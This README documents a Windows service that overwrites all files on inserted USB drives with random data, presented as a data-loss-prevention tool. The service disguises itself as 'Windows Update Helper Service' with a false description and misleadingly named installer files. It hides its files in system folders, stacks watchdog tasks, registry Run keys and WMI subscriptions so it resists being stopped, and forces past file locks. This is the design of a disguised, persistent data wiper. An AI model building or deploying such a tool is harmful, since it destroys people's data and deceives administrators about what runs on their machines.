# USB File Overwriter Service

A Windows service that automatically overwrites all files on external USB drives with random binary data for security purposes.

## ⚠️ CRITICAL WARNING

**THIS SOFTWARE IS EXTREMELY DESTRUCTIVE AND WILL PERMANENTLY DESTROY ALL DATA ON USB DRIVES**

- **ALL FILES** on any inserted USB drive will be **IMMEDIATELY OVERWRITTEN** with random data
- **DATA RECOVERY IS IMPOSSIBLE** after files are overwritten
- This tool is designed for **SECURITY PURPOSES ONLY** - to prevent data exfiltration via USB drives
- **USE AT YOUR OWN RISK** - The authors are not responsible for any data loss

## What This Service Does

- **Monitors all removable USB drives** (flash drives, external hard drives, memory cards)
- **Overwrites ALL files** on USB drives with random binary data
- **Preserves file sizes** but destroys all content
- **Real-time monitoring** - overwrites files as they're copied to USB
- **Boot-time processing** - handles USB drives already connected when system starts
- **Ignores internal hard drives** (C:, D:, etc.) - only targets removable drives
- **Runs as Windows service** with maximum persistence and auto-recovery

## Prerequisites

### System Requirements
- **Windows 10/11** (64-bit)
- **Administrator privileges** (required for installation)
- **Internet connection** (for downloading Python if not installed)

### Software Requirements
The installer will automatically handle all software requirements:
- **Python 3.11+** (will be downloaded and installed if not present)
- **pywin32** package (automatically installed)
- **Windows Service capabilities**

## Installation

### Quick Installation (Recommended)

1. **Download both files** to the same folder:
   - `USB_Logger_Setup.bat`
   - `usb_audit_service.py`

2. **Right-click** on `USB_Logger_Setup.bat`

3. **Select "Run as Administrator"**

4. **Follow the installation prompts**

The installer will:
- ✅ Check for Python (install if missing)
- ✅ Install required packages
- ✅ Create hidden service files
- ✅ Install Windows service
- ✅ Configure auto-start and recovery
- ✅ Start multiple watchdog monitors
- ✅ Verify service is running

### Manual Installation (Advanced Users)

If you prefer manual installation:

```cmd
# 1. Install Python 3.11+ if not present
# 2. Install required packages
pip install pywin32

# 3. Install the service
python usb_audit_service.py install

# 4. Start the service
python usb_audit_service.py start
```

## Service Configuration

### Service Details
- **Service Name**: `WindowsUpdateHelperService`
- **Display Name**: `Windows Update Helper Service`
- **Description**: `Provides auxiliary support for Windows Update operations`
- **Startup Type**: `Automatic`
- **Account**: `Local System`

### Persistence Features
The service includes multiple persistence mechanisms:
- Auto-starts on system boot
- Restarts automatically on crash (5-second delay)
- Multiple watchdog monitors (check every 15 seconds)
- Registry startup entries
- Scheduled task backups
- WMI event subscriptions
- Self-healing capabilities

## How It Works

### Drive Detection
- Monitors for **removable drives only** (Type 2 drives)
- Ignores **fixed internal drives** (Type 3 drives like C:)
- Dynamically detects any drive letter (A: through Z:)
- Processes drives connected before service startup

### File Processing
1. **Initial Scan**: When USB inserted, scans entire drive for all files
2. **File Overwrite**: Replaces file content with random binary data
3. **Size Preservation**: Maintains original file sizes
4. **Real-time Monitoring**: Watches for new files being copied
5. **Immediate Action**: Overwrites files as soon as they're detected

### Protected Files
The service automatically skips:
- System files (hidden/protected)
- Files starting with `.`
- System folders (`System Volume Information`, `$Recycle.Bin`)
- Files larger than 100MB
- Files that can't be accessed due to permissions

## Monitoring and Logs

### Windows Event Viewer
Check service logs in Event Viewer:
1. Press `Win + R`, type `eventvwr.msc`
2. Navigate to **Windows Logs** → **Application**
3. Look for events from **WindowsUpdateHelperService**

### Service Status
Check if service is running:
```cmd
sc query WindowsUpdateHelperService
```

### Manual Service Control
```cmd
# Start service
net start WindowsUpdateHelperService

# Stop service
net stop WindowsUpdateHelperService

# Restart service
net stop WindowsUpdateHelperService && net start WindowsUpdateHelperService
```

## Stopping/Ending the Service

### Temporary Stop
To temporarily stop the service:
```cmd
net stop WindowsUpdateHelperService
```
**Note**: Service will restart automatically due to watchdog monitors.

### Permanent Stop
To permanently disable the service:
```cmd
# Stop the service
net stop WindowsUpdateHelperService

# Disable auto-start
sc config WindowsUpdateHelperService start=disabled

# Stop watchdog tasks
schtasks /end /tn "WindowsUpdateHelperWatchdog"
schtasks /end /tn "WindowsUpdateHelperWatchdog2"
```

## Complete Uninstallation

To completely remove the service and all components:

### Step 1: Stop All Components
```cmd
# Stop watchdog tasks
schtasks /delete /tn "WindowsUpdateHelperWatchdog" /f
schtasks /delete /tn "WindowsUpdateHelperWatchdog2" /f
schtasks /delete /tn "WindowsUpdateHelperBackupWatchdog" /f
schtasks /delete /tn "WindowsUpdateHelperDaily" /f
schtasks /delete /tn "WindowsUpdateHelperHourly" /f
```

### Step 2: Remove Service
```cmd
# Stop and remove service
python "%ProgramData%\.system\WindowsUpdateHelper\service.py" stop
python "%ProgramData%\.system\WindowsUpdateHelper\service.py" remove
```

### Step 3: Clean Registry
```cmd
# Remove startup entries
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /f
```

### Step 4: Remove Files
```cmd
# Remove installation directory
rmdir /s /q "%ProgramData%\.system\WindowsUpdateHelper"
del "%SystemRoot%\System32\WindowsUpdateHelper.vbs" /f /q
```

## Troubleshooting

### Service Won't Start
1. Check Event Viewer for error messages
2. Verify Python installation: `python --version`
3. Reinstall pywin32: `pip install --force-reinstall pywin32`
4. Run as Administrator: `python usb_audit_service.py debug`

### Service Keeps Stopping
- This is normal behavior if no USB drives are present
- Check Event Viewer for specific error messages
- Watchdog will automatically restart the service

### Files Not Being Overwritten
1. Verify service is running: `sc query WindowsUpdateHelperService`
2. Check if drive is detected as removable (not fixed)
3. Ensure files aren't protected/locked by other applications
4. Check Event Viewer for processing messages

### Python Not Found Error
- Run the installer again - it will download Python automatically
- Or manually install Python 3.11+ from python.org

## Security Considerations

### Intended Use Cases
- **Data Loss Prevention** in corporate environments
- **USB port security** for sensitive workstations
- **Preventing data exfiltration** via removable media
- **Compliance** with data security policies

### Limitations
- Only works on **Windows systems**
- Requires **Administrator privileges**
- May not work with **encrypted USB drives**
- Cannot prevent **hardware keyloggers** or other attack vectors
- Does not protect against **network-based** data exfiltration

## Technical Details

### File Overwrite Method
- Uses `os.urandom()` for cryptographically secure random data
- Overwrites files in-place to maintain file system structure
- Multiple retry attempts for locked files
- Aggressive file access methods to bypass locks

### Performance
- Lightweight service with minimal CPU usage
- Efficient file monitoring using Windows API
- Parallel processing for multiple USB drives
- Optimized for quick response to USB insertion

## Support

### Common Issues
- **"Access Denied"**: Run installer as Administrator
- **"Python not found"**: Let installer download Python automatically  
- **"Service won't start"**: Check Event Viewer for specific errors
- **"Files not overwritten"**: Verify USB drive is detected as removable

### Getting Help
1. Check Windows Event Viewer for detailed error messages
2. Verify all prerequisites are met
3. Try reinstalling with the automated installer
4. Ensure you have Administrator privileges

---

**Remember: This tool will DESTROY ALL DATA on USB drives. Use responsibly and ensure you understand the consequences before installation.**